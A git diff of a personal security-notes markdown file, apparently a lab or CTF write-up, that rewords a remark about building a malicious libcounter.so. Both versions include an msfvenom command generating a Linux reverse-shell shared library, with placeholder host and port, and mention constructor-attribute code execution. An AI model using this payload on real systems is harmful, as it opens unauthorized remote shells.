@@ -197,10 +197,7 @@ To test it on ourselves:
 
 ![image](https://github.com/partyh4t/Cyber-Notes/assets/114421293/2241fdf0-ce13-4586-8d37-714f465a592f)
 
-`msfvenom` could have saved me the hassle of trying to get a properly working `libcounter.so` reverse shell, since I had to find out about`__attribute__((constructor))`
-
-do:
-`msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf.so -o libcounter.so`
+We could have used `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf.so -o libcounter.so` as that would've saved me the hassle of trying to get a properly working malicious `libcounter.so` , since I had to find out about`__attribute__((constructor))`
 
 
 
